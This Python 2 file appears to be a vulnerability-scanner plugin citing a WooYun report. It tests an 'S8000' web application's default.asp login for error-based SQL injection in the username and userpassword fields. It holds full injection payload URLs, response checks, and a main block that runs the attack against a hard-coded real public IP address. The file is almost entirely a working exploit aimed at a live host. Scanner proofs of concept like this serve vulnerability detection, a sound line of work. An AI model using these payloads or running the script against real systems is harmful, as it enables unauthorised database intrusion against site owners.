#!/usr/bin/env python
#-*- coding:utf-8 -*-
#http://www.wooyun.org/bugs/wooyun-2015-0145966

import urlparse
def assign(service, arg):
    if service == "s8000":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg + "default.asp?username=guest_s'+AND+(SELECT+2983+FROM(SELECT+COUNT(*),CONCAT(md5(1),(SELECT+(ELT(2983%3d2983,1))),0x7171627171,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+AND+'BQDK'%3d'BQDK&userpassword=guest_s&lang=0&login=s8000&"
    code, head, res, errcode, _ = curl.curl2(poc)
    if 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole("S8000 sqli, param:username")
    poc = arg + "default.asp?userpassword=guest_s'+AND+(SELECT+2983+FROM(SELECT+COUNT(*),CONCAT(md5(1),(SELECT+(ELT(2983%3d2983,1))),0x7171627171,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+AND+'BQDK'%3d'BQDK&username=guest_s&lang=0&login=s8000&"
    code, head, res, errcode, _ = curl.curl2(poc)
    if 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole("S8000 sqli, param:userpassword")

if __name__ == '__main__':
    from dummy import *
    audit(assign('s8000', 'http://218.21.214.60/')[1])